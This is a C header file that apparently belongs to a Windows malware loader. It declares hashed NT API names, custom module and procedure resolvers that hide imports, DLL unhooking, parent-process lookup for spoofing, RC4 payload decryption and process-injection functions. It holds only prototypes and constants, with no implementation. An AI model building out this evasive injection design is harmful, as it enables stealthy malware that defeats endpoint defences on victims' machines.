/*
    the file that include the prototype of functions - hashes - to be included in all needed .c files
*/
#pragma once

#include <Windows.h>


#ifndef HEADER_H
#define HEADER_H


#define SEED            0x15
#define KEY_SIZE        0x10

#define DEREF( name )		*(	UINT_PTR	*)	(name)
#define DEREF_64( name )	*(	DWORD64		*)	(name)
#define DEREF_32( name )	*(	DWORD		*)	(name)
#define DEREF_16( name )	*(	WORD		*)	(name)
#define DEREF_8( name )		*(	BYTE		*)	(name)

#define HASHA(API)		    (_HashStringRotr32A((PCHAR) API))
#define HASHW(API)		    (_HashStringRotr32W((PWCHAR) API))


#define NTDLLDLL								"NTDLL.DLL"
#define KERNEL32DLL								"KERNEL32.DLL"
#define ADVAPI32DLL                             "ADVAPI32.DLL"


#define LdrLoadDll_StrHashed                    0xAC97B4C4

#define NtQuerySystemInformation_StrHashed      0x38110916

#define NtAllocateVirtualMemory_StrHashed       0xE4186D2D
#define SystemFunction032_StrHashed             0x553383F9
#define NtProtectVirtualMemory_StrHashed        0xCEC0DC30
#define NtWriteVirtualMemory_StrHashed          0x12B33629

#define RtlCreateProcessParametersEx_StrHashed  0x02561DC9
#define NtCreateUserProcess_StrHashed           0xB5E1B717

#define NtCreateSection_StrHashed               0xDD2991DC
#define NtOpenSection_StrHashed                 0x99EB3303
#define NtMapViewOfSection_StrHashed            0x629BBD5F
#define NtUnmapViewOfSection_StrHashed          0x9B31DE5F
#define NtClose_StrHashed                       0x55C7CA75

#define OpenProcess_StrHashed                   0xB76C0DF9
#define GetProcessId_StrHashed                  0x2C701EA7
#define DebugActiveProcess_StrHashed            0x830CBE16
#define DebugActiveProcessStop_StrHashed        0xE8E4E146
#define NtQueueApcThread_StrHashed              0x1E9D5F0F
#define CloseHandle_StrHashed                   0xAC289635




//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------


VOID		_RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
SIZE_T		_CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);

wchar_t*    _strcatW(wchar_t* dest, const wchar_t* src);
wchar_t*    _strcpyW(wchar_t* dest, const wchar_t* src);
char*       _strcatA(char* dest, const char* src);
char*       _strcpyA(char* dest, const char* src);

SIZE_T		_StrlenA(LPCSTR String);
SIZE_T		_StrlenW(LPCWSTR String);

DWORD		_HashStringRotr32A(PCHAR String);
DWORD       _HashStringRotr32W(PWCHAR String);

VOID		_ZeroMemory(PVOID Destination, SIZE_T Size);
PVOID		_memcpy(void* dst, const void* src, SIZE_T count);
CHAR		_ToUpper(CHAR c);
UINT32		_CopyDotStr(PCHAR String);


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL RefreshAllDlls();

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

HMODULE GetModuleHandleH(LPSTR ModuleName);
HMODULE LoadLibraryH(LPSTR DllName);
FARPROC GetProcAddressH(HMODULE hModule, DWORD Hash);

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL GetParentProcessid(
    IN PCWSTR ParentProcessName,
    OUT PDWORD pdwProcessId
);

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL NtCreateProcess(
    IN	PWSTR	szTargetProcess,
    IN	PWSTR	szTargetProcessParameters,
    IN	PWSTR	szTargetProcessPath,
    IN	HANDLE	hParentProcess,
    OUT PHANDLE hProcess,
    OUT PHANDLE hThread
);

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL InjectPayload(
    IN  HANDLE hProcess,
    IN  PVOID  pPayload,
    IN  SIZE_T sPayloadSize,
    OUT PVOID* ppAddress,
    IN  PBYTE pRc4Key,
    IN  DWORD dwRc4KeySize
);

BOOL InjectPayload2(
    IN  HANDLE hProcess,
    IN  PVOID  pPayload,
    IN  SIZE_T sPayloadSize,
    OUT PVOID* ppAddress,
    IN  PBYTE pRc4Key,
    IN  DWORD dwRc4KeySize
);




//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------




#endif // !HEADER_H
